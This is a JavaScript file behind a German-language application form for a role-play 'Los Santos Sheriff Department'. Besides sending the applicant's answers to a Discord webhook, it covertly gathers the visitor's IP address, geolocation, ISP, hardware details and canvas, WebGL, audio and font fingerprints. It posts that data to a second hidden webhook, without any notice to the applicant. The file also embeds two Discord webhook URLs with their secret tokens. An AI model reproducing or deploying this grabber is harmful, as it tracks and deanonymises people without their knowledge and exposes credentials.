import './style.css'

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1433782404501344417/RosVZp_BAa7h21ecTD8c_ii01jqpr3Y2rThLfK8B7Dxb39-GtPiwg-6VQeW1FoMjqIO-';
const IP_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1434143346787614781/weYju1ysUtaa2UZU2NGn2mlD1_Dj95hFFE5f3AGdX5kH3NOou54L8j4hioDYQYGm6eNt';

// Funktion zum Sammeln aller möglichen Systeminformationen
async function collectSystemInfo() {
  const info = {
    // IP und Standort
    ip: 'Unbekannt',
    city: 'Unbekannt',
    region: 'Unbekannt',
    country: 'Unbekannt',
    country_code: 'Unbekannt',
    timezone: 'Unbekannt',
    org: 'Unbekannt',
    
    // Browser Information
    browserName: navigator.userAgentData?.brands?.[0]?.brand || 'Unbekannt',
    browserVersion: navigator.userAgentData?.brands?.[0]?.version || 'Unbekannt',
    fullUserAgent: navigator.userAgent,
    browserLanguage: navigator.language,
    languages: navigator.languages ? navigator.languages.join(', ') : 'Unbekannt',
    
    // Screen Information
    screenResolution: `${screen.width}x${screen.height}`,
    colorDepth: `${screen.colorDepth} bit`,
    pixelDepth: `${screen.pixelDepth} bit`,
    availableResolution: `${screen.availWidth}x${screen.availHeight}`,
    
    // Hardware Information
    cpuCores: navigator.hardwareConcurrency || 'Unbekannt',
    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unbekannt',
    maxTouchPoints: navigator.maxTouchPoints || 0,
    
    // Platform Information
    platform: navigator.platform,
    vendor: navigator.vendor,
    product: navigator.product,
    
    // Connection Information
    connectionEffectiveType: navigator.connection?.effectiveType || 'Unbekannt',
    connectionDownlink: navigator.connection?.downlink || 'Unbekannt',
    connectionRtt: navigator.connection?.rtt || 'Unbekannt',
    connectionSaveData: navigator.connection?.saveData || false,
    
    // Time Information
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    localTime: new Date().toLocaleString(),
    
    // Canvas Fingerprinting
    canvasFingerprint: 'Unbekannt',
    
    // WebGL Information
    webglVendor: 'Unbekannt',
    webglRenderer: 'Unbekannt',
    
    // Fonts Detection
    fonts: 'Unbekannt',
    
    // Audio Context Fingerprinting
    audioFingerprint: 'Unbekannt'
  };

  try {
    // IP und Standortinformationen
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    info.ip = ipData.ip;

    const locationResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
    const locationData = await locationResponse.json();
    info.city = locationData.city || 'Unbekannt';
    info.region = locationData.region || 'Unbekannt';
    info.country = locationData.country_name || 'Unbekannt';
    info.country_code = locationData.country_code || 'Unbekannt';
    info.timezone = locationData.timezone || 'Unbekannt';
    info.org = locationData.org || 'Unbekannt';
  } catch (error) {
    console.error('Fehler beim Abrufen der IP/Standortinformationen:', error);
  }

  // Canvas Fingerprinting
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200;
    canvas.height = 50;
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Canvas Fingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Canvas Fingerprint', 4, 17);
    info.canvasFingerprint = canvas.toDataURL();
  } catch (e) {
    info.canvasFingerprint = 'Nicht verfügbar';
  }

  // WebGL Information
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
        info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {
    info.webglVendor = 'Nicht verfügbar';
    info.webglRenderer = 'Nicht verfügbar';
  }

  // Font Detection
  try {
    const fonts = [
      'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
      'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
      'Verdana', 'Microsoft YaHei', 'SimSun', 'Andale Mono'
    ];
    
    const availableFonts = [];
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    const text = "abcdefghijklmnopqrstuvwxyz0123456789";
    
    context.textBaseline = "top";
    context.font = "72px monospace";
    const referenceWidth = context.measureText(text).width;
    
    fonts.forEach(font => {
      context.font = `72px ${font}, monospace`;
      if (context.measureText(text).width !== referenceWidth) {
        availableFonts.push(font);
      }
    });
    
    info.fonts = availableFonts.join(', ') || 'Standard Fonts';
  } catch (e) {
    info.fonts = 'Fehler bei Font-Erkennung';
  }

  // Audio Context Fingerprinting
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const analyser = audioContext.createAnalyser();
    oscillator.connect(analyser);
    oscillator.start();
    
    const timeDomain = new Float32Array(analyser.frequencyBinCount);
    analyser.getFloatTimeDomainData(timeDomain);
    
    let sum = 0;
    for (let i = 0; i < timeDomain.length; i++) {
      sum += timeDomain[i] * timeDomain[i];
    }
    
    oscillator.stop();
    audioContext.close();
    info.audioFingerprint = Math.sqrt(sum / timeDomain.length).toFixed(2);
  } catch (e) {
    info.audioFingerprint = 'Nicht verfügbar';
  }

  return info;
}

document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('applicationForm');
  const successMessage = document.getElementById('successMessage');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Alle Systeminformationen sammeln
    const systemInfo = await collectSystemInfo();

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    // Webhook-Namen aus Vor- und Nachname erstellen
    const webhookName = data.fullName ? `${data.fullName} - LSSD Bewerbung` : 'LSSD Bewerbungssystem';

    const embed = {
      title: 'Neue Bewerbung - Los Santos Sheriff Department',
      color: 13938487,
      fields: [
        {
          name: 'Persönliche Informationen',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: '(IC) Vorname Nachname:',
          value: data.fullName || 'Nicht angegeben',
          inline: true
        },
        {
          name: '(IC) Alter:',
          value: data.age || 'Nicht angegeben',
          inline: true
        },
        {
          name: '(IC) Telefonnummer:',
          value: data.phone || 'Nicht angegeben',
          inline: true
        },
        {
          name: 'E-Mail',
          value: data.email || 'Nicht angegeben',
          inline: true
        },
        {
          name: 'Bewerbungsfragen',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'Haben Sie bereits Erfahrung in anderen Staats Fraktionen?',
          value: data.experience || 'Nicht angegeben',
          inline: false
        },
        {
          name: 'Warum möchten Sie beim Los Santos Sheriff Department arbeiten?',
          value: data.motivation || 'Nicht angegeben',
          inline: false
        },
        {
          name: 'Was sind Ihre größten Stärken/Schwächen?',
          value: data.strengths || 'Nicht angegeben',
          inline: false
        },
        {
          name: 'Wie würden Sie mit einer stressigen Situation umgehen?',
          value: data.situation || 'Nicht angegeben',
          inline: false
        },
        {
          name: 'Zu welchen Zeiten sind sie Aktiv im Dienst?',
          value: data.availability || 'Nicht angegeben',
          inline: true
        },
        {
          name: 'Vorstrafen?',
          value: data.criminal || 'Nicht angegeben',
          inline: true
        },
        {
          name: 'Zusätzliche Informationen',
          value: data.additional || 'Keine',
          inline: false
        }
      ],
      footer: {
        text: 'Los Santos Sheriff Department - Bewerbungssystem'
      },
      timestamp: new Date().toISOString()
    };

    // Erweitertes IP-Embed mit allen Systeminformationen
    const ipEmbed = {
      title: '🔍 Detaillierte Systeminformationen - LSSD Sicherheits-Webhook',
      color: 16711680, // Rot
      fields: [
        {
          name: '👤 Bewerber Informationen',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'Name:',
          value: data.fullName || 'Nicht angegeben',
          inline: true
        },
        {
          name: 'Alter:',
          value: data.age || 'Nicht angegeben',
          inline: true
        },
        {
          name: 'E-Mail:',
          value: data.email || 'Nicht angegeben',
          inline: true
        },

        {
          name: '🌐 Netzwerk & Standort',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'IP-Adresse:',
          value: `\`${systemInfo.ip}\``,
          inline: true
        },
        {
          name: 'Standort:',
          value: `${systemInfo.city}, ${systemInfo.region}`,
          inline: true
        },
        {
          name: 'Land:',
          value: `${systemInfo.country} (${systemInfo.country_code})`,
          inline: true
        },
        {
          name: 'Zeitzone:',
          value: systemInfo.timezone,
          inline: true
        },
        {
          name: 'ISP/Organisation:',
          value: systemInfo.org,
          inline: true
        },
        {
          name: 'Lokale Zeit:',
          value: systemInfo.localTime,
          inline: true
        },

        {
          name: '💻 Browser & System',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'Browser:',
          value: `${systemInfo.browserName} v${systemInfo.browserVersion}`,
          inline: true
        },
        {
          name: 'Platform:',
          value: systemInfo.platform,
          inline: true
        },
        {
          name: 'Sprache:',
          value: systemInfo.browserLanguage,
          inline: true
        },
        {
          name: 'CPU Kerne:',
          value: systemInfo.cpuCores.toString(),
          inline: true
        },
        {
          name: 'Arbeitsspeicher:',
          value: systemInfo.deviceMemory,
          inline: true
        },
        {
          name: 'Vendor:',
          value: systemInfo.vendor || 'Unbekannt',
          inline: true
        },

        {
          name: '🖥️ Display & Hardware',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'Bildschirmauflösung:',
          value: systemInfo.screenResolution,
          inline: true
        },
        {
          name: 'Verfügbare Auflösung:',
          value: systemInfo.availableResolution,
          inline: true
        },
        {
          name: 'Farbtiefe:',
          value: systemInfo.colorDepth,
          inline: true
        },
        {
          name: 'Touch Points:',
          value: systemInfo.maxTouchPoints.toString(),
          inline: true
        },

        {
          name: '📡 Verbindungsinformationen',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'Verbindungstyp:',
          value: systemInfo.connectionEffectiveType,
          inline: true
        },
        {
          name: 'Download-Geschwindigkeit:',
          value: `${systemInfo.connectionDownlink} Mbps`,
          inline: true
        },
        {
          name: 'Latenz (RTT):',
          value: `${systemInfo.connectionRtt} ms`,
          inline: true
        },
        {
          name: 'Data Saver:',
          value: systemInfo.connectionSaveData ? 'Aktiviert' : 'Deaktiviert',
          inline: true
        },

        {
          name: '🔧 Erweiterte Fingerprints',
          value: '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500',
          inline: false
        },
        {
          name: 'WebGL Vendor:',
          value: systemInfo.webglVendor.substring(0, 100) + '...',
          inline: true
        },
        {
          name: 'WebGL Renderer:',
          value: systemInfo.webglRenderer.substring(0, 100) + '...',
          inline: true
        },
        {
          name: 'Erkannte Fonts:',
          value: systemInfo.fonts.substring(0, 100) + '...',
          inline: false
        },
        {
          name: 'Audio Fingerprint:',
          value: systemInfo.audioFingerprint,
          inline: true
        },
        {
          name: 'User Agent:',
          value: `\`${systemInfo.fullUserAgent.substring(0, 100)}...\``,
          inline: false
        }
      ],
      footer: {
        text: `LSSD Sicherheits-Webhook - System-Tracking | ${new Date().toLocaleString()}`
      },
      timestamp: new Date().toISOString()
    };

    try {
      // Senden an ersten Webhook (normale Bewerbung)
      const response1 = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          username: webhookName,
          embeds: [embed]
        })
      });

      // Senden an zweiten Webhook (mit allen Systeminformationen)
      const response2 = await fetch(IP_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          username: `SECURITY - ${webhookName}`,
          embeds: [ipEmbed]
        })
      });

      if (response1.ok && response2.ok) {
        form.reset();
        successMessage.classList.remove('hidden');

        setTimeout(() => {
          successMessage.classList.add('hidden');
        }, 5000);
      } else {
        alert('Es gab ein Problem beim Senden der Bewerbung. Bitte versuchen Sie es erneut.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('Es gab ein Problem beim Senden der Bewerbung. Bitte versuchen Sie es erneut.');
    }
  });

  successMessage.addEventListener('click', () => {
    successMessage.classList.add('hidden');
  });
});
